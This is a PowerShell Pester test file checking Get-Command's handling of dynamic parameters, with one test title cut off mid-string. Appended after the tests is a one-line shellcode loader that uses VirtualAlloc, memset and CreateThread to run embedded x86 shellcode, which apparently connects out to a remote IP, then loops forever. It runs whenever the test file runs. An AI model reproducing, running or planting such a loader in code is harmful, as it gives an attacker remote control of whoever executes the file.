

Describe "Get-Command Tests" -Tags "CI" {
    BeforeAll {
        function TestGetCommand-DynamicParametersDCR
        {
        [CmdletBinding()]
            param (
            [Parameter(Mandatory = $true, Position = 0)]
            [ValidateSet("ReturnNull", "ReturnThis", "Return1", "Return2","Return3", "ReturnDuplicateParameter", "ReturnAlias", "ReturnDuplicateAlias","ReturnObjectNoParameters", "ReturnGenericParameter", "ThrowException")]
            [string] $TestToRun,

            [Parameter()]
            [Type]$ParameterType
            )

            DynamicParam {
                if ( ! $TestToRun ) {
                    $TestToRun = "returnnull"
                }
                $dynamicParamDictionary = [System.Management.Automation.RuntimeDefinedParameterDictionary]::new()
                switch ( $TestToRun )
                {
                    "returnnull" {
                        $dynamicParamDictionary = $null
                        break
                     }
                     "return1" {
                        $attr = [System.Management.Automation.ParameterAttribute]::new()
                        $attr.Mandatory = $true
				        $dynamicParameter = [System.Management.Automation.RuntimeDefinedParameter]::new("OneString",[string],$attr)
                        $dynamicParamDictionary.Add("OneString",$dynamicParameter)
                        break
                    }
                    "return2" {
                        $attr1 = [System.Management.Automation.ParameterAttribute]::new()
                        $attr1.Mandatory = $true
                        $attr1.ParameterSetName = "__AllParameterSets"
                        $ac1 = [Collections.ObjectModel.Collection[Attribute]]::new()
                        $ac1.Add($attr1)
                        $p1 = [System.Management.Automation.RuntimeDefinedParameter]::new("OneString",[string],$ac1)
                        $dynamicParamDictionary.Add("OneString",$p1)

                        $attr2 = [System.Management.Automation.ParameterAttribute]::new()
                        $attr2.Mandatory = $false
                        $attr2.ParameterSetName = "__AllParameterSets"
                        $VRattr = [System.Management.Automation.ValidateRangeAttribute]::new(5,9)

                        $ac2 = [Collections.ObjectModel.Collection[Attribute]]::new()
                        $ac2.Add($attr2)
                        $ac2.Add($VRattr)
                        $p2 = [System.Management.Automation.RuntimeDefinedParameter]::New("TwoInt",[int],$ac2)
                        $dynamicParamDictionary.Add("TwoInt",$p2)
                        break
                    }
                    "return3" {
                        $attr1 = [System.Management.Automation.ParameterAttribute]::new()
                        $attr1.Mandatory = $true
                        $attr1.ParameterSetName = "__AllParameterSets"
                        $ac1 = [Collections.ObjectModel.Collection[Attribute]]::new()
                        $ac1.Add($attr1)
                        $p1 = [System.Management.Automation.RuntimeDefinedParameter]::new("OneString",[string],$ac1)
                        $dynamicParamDictionary.Add("OneString",$p1)

                        $attr2 = [System.Management.Automation.ParameterAttribute]::new()
                        $attr2.Mandatory = $false
                        $attr2.ParameterSetName = "__AllParameterSets"
                        $VRattr = [System.Management.Automation.ValidateRangeAttribute]::new(5,9)

                        $ac2 = [Collections.ObjectModel.Collection[Attribute]]::new()
                        $ac2.Add($attr2)
                        $ac2.Add($VRattr)
                        $p2 = [System.Management.Automation.RuntimeDefinedParameter]::New("TwoInt",[int],$ac2)
                        $dynamicParamDictionary.Add("TwoInt",$p2)

                        $attr3 = [System.Management.Automation.ParameterAttribute]::new()
                        $attr3.Mandatory = $false
                        $attr3.ParameterSetName = "__AllParameterSets"
                        $ac3 = [Collections.ObjectModel.Collection[Attribute]]::new()
                        $ac3.Add($attr3)
                        $p3 = [System.Management.Automation.RuntimeDefinedParameter]::new("ThreeBool",[bool],$ac3)
                        $dynamicParamDictionary.Add("ThreeBool",$p3)
                        break
                    }
                    "returnduplicateparameter" {
                        $attr1 = [System.Management.Automation.ParameterAttribute]::new()
                        $attr1.Mandatory = $false
                        $attr1.ParameterSetName = "__AllParameterSets"
                        $ac1 = [Collections.ObjectModel.Collection[Attribute]]::new()
                        $ac1.Add($attr1)
                        $p1 = [System.Management.Automation.RuntimeDefinedParameter]::new("TestToRun",[int],$ac1)
                        $dynamicParamDictionary.Add("TestToRun",$p1)
                        break
                    }
                    "returngenericparameter" {
                        $attr1 = [System.Management.Automation.ParameterAttribute]::new()
                        $attr1.ParameterSetName = "__AllParameterSets"
                        $ac1 = [Collections.ObjectModel.Collection[Attribute]]::new()
                        $ac1.Add($attr1)
                        $p1 = [System.Management.Automation.RuntimeDefinedParameter]::new("TypedValue",$ParameterType,$ac1)
                        $dynamicParamDictionary.Add("TypedValue",$p1)
                        break
                    }
                    default {
                        throw ([invalidoperationexception]::new("unable to determine which dynamic parameters to return!"))
                        break
                    }
                }
                return $dynamicParamDictionary
            }

            BEGIN {
                $ReturnNull = "ReturnNull"
                $ReturnThis = "ReturnThis"
                $ReturnAlias = "ReturnAlias"
                $ReturnDuplicateAlias = "ReturnDuplicateAlias"
                $Return1 = "Return1"
                $Return2 = "Return2"
                $Return3 = "Return3"
                $ReturnDuplicateParameter = "ReturnDuplicateParameter"
                $ReturnObjectNoParameters = "ReturnObjectNoParameters"
                $ReturnGenericParameter = "ReturnGenericParameter"
                $ThrowException = "ThrowException"
                return $dynamicParamDictionary
            }
        }

        function GetDynamicParameter($cmdlet, $parameterName)
        {
            foreach ($paramSet in $cmdlet.ParameterSets)
            {
                foreach ($pinfo in $paramSet.Parameters)
                {
                    if ($pinfo.Name -eq $parameterName)
                    {
                        $foundParam = $pinfo
                        break
                    }
                }
                if($null -ne $foundParam)
                {
                    break
                }
            }
            return $foundParam
        }

        function VerifyDynamicParametersExist($cmdlet, $parameterNames)
        {
            foreach($paramName in $parameterNames)
            {
                $foundParam = GetDynamicParameter -cmdlet $cmdlet -parameterName $paramName
                $foundParam.Name | Should -BeExactly $paramName
            }
        }

        function VerifyParameterType($cmdlet, $parameterName, $ParameterType)
        {
            $foundParam = GetDynamicParameter -cmdlet $cmdlet -parameterName $parameterName
            $foundParam.ParameterType | Should -Be $ParameterType
        }
    }

    It "Verify that Get-Command Get-Content includes the dynamic parameters when the cmdlet is checked against the file system provider implementation" {
        $fullPath = Join-Path $TestDrive -ChildPath "blah"
        New-Item -Path $fullPath -ItemType directory -Force
        $results = Get-Command Get-Content -Path $fullPath
        $dynamicParameter = "Wait", "Encoding", "Delimiter"
        VerifyDynamicParametersExist -cmdlet $results[0] -parameterNames $dynamicParameter
    }

    It "Verify that Get-Command Get-Content doesn't have any dynamic parameters for Function provider" {
        $results =Get-Command Get-Content -Path function:
        $dynamicParameter = "Wait", "Encoding", "Delimiter"
        foreach ($dynamicPara in $dynamicParameter)
        {
            $results[0].ParameterSets.Parameters.Name -contains $dynamicPara | Should -BeFalse
        }
    }

    It "Verify that the specified dynamic parameter exists in the CmdletInfo result returned" {
        $results = Get-Command TestGetCommand-DynamicParametersDCR -TestToRun return1
        $dynamicParameter = "OneString"
        VerifyDynamicParametersExist -cmdlet $results[0] -parameterNames $dynamicParameter
        VerifyParameterType -cmdlet $results[0] -parameterName $dynamicParameter -ParameterType string
    }

    It "Verify three dynamic parameters are created properly" {
        $results = Get-Command TestGetCommand-DynamicParametersDCR -TestToRun return3
        $dynamicParameter = "OneString", "TwoInt", "ThreeBool"

        VerifyDynamicParametersExist -cmdlet $results[0] -parameterNames $dynamicParameter
        VerifyParameterType -cmdlet $results[0] -parameterName "OneString" -parameterType string
        VerifyParameterType -cmdlet $results[0] -parameterName "TwoInt" -parameterType Int
        VerifyParameterType -cmdlet $results[0] -parameterName "ThreeBool" -parameterType bool
    }

    It "Verify dynamic parameter type is process" {
        $results = Get-Command TestGetCommand-DynamicParametersDCR -Args '-TestToRun','returngenericparameter','-parametertype','System.Diagnostics.Process'
        VerifyParameterType -cmdlet $results[0] -parameterName "TypedValue" -parameterType System.Diagnostics.Process
    }

    It "Verify a single cmdlet returned using verb and noun parameter set syntax works properly" {
        $paramName = "OneString"
        $results = Get-Command -Verb TestGetCommand -Noun DynamicParametersDCR -TestToRun Return1
        VerifyDynamicParametersExist -cmdlet $results[0] -parameterNames $paramName
        VerifyParameterType -cmdlet $results[0] -parameterName $paramName -parameterType string
    }

    It "Verify Single Cmdlet Using Verb&Noun ParameterSet" {
        $paramName = "Encoding"
        $results = Get-Command -Verb get -Noun content -Encoding Unicode
        VerifyDynamicParametersExist -cmdlet $results[0] -parameterNames $paramName
        VerifyParameterType -cmdlet $results[0] -parameterName $paramName -parameterType System.Text.Encoding
    }

    It "Verify Single Cmdlet Using Verb&Noun ParameterSet With Usage" {
        $results =  Get-Command -Verb get -Noun content -Encoding Unicode -Syntax
        $results.ToString() | Should -Match "-Encoding"
        $results.ToString() | Should -Match "-Wait"
        $results.ToString() | Should -Match "-Delimiter"
    }

    It "Test Script Lookup Positive Script Info" {
        $tempFile = "mytempfile.ps1"
        $fullPath = Join-Path $TestDrive -ChildPath $tempFile
        "$a = dir" > $fullPath
        $results = Get-Command $fullPath

        $results.Name | Should -BeExactly $tempFile
        $results.Definition | Should -BeExactly $fullPath
    }

    It "Two dynamic parameters are created properly" {
        $results = Get-Command TestGetCommand-DynamicParametersDCR -TestToRun return2
        $dynamicParameter = "OneString", "TwoInt"
        VerifyDynamicParametersExist -cmdlet $results[0] -parameterNames $dynamicParameter
        VerifyParameterType -cmdlet $results[0] -parameterName "OneString" -ParameterType string
        VerifyParameterType -cmdlet $results[0] -parameterName "TwoInt" -ParameterType int
    }

    It "Throw an Exception when set TestToRun to 'returnduplicateparameter'" {
        { Get-Command TestGetCommand-DynamicParametersDCR -TestToRun returnduplicateparameter -ErrorAction Stop } |
            Should -Throw -ErrorId "GetCommandMetadataError,Microsoft.PowerShell.Commands.GetCommandCommand"
    }

    It "verify if get the proper dynamic parameter type skipped by issue 
        $results = Get-Command TestGetCommand-DynamicParametersDCR -TestToRun returngenericparameter -parametertype System.Diagnostics.Process
        VerifyParameterType -cmdlet $results[0] -parameterName "TypedValue" -parameterType System.Diagnostics.Process
    }

    It "It works with Single Cmdlet Using Verb&Noun ParameterSet" {
        $paramName = "Encoding"
        $results = Get-Command -Verb get -Noun content -encoding UTF8
        VerifyDynamicParametersExist -cmdlet $results[0] -parameterNames $paramName
        VerifyParameterType -cmdlet $results[0] -parameterName $paramName -ParameterType System.Text.Encoding
    }

    
    It "[Unsupported]It works with Single Cmdlet Using Verb&Noun ParameterSet With Synopsis" -Pending {
        $paramName = "Encoding"
        $results = Get-Command -Verb get -Noun content -encoding UTF8 -Synop
        VerifyDynamicParametersExist -cmdlet $results[0] -parameterNames $paramName
        VerifyParameterType -cmdlet $results[0] -parameterName $paramName -ParameterType System.Text.Encoding
    }

    It "Piping more than one CommandInfo works" {
        $result = Get-Command -Name Add-Content, Get-Content | Get-Command
        $result.Count | Should -Be 2
        $result.Name | Should -Be "Add-Content","Get-Content"
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xc7,0x01,0x36,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

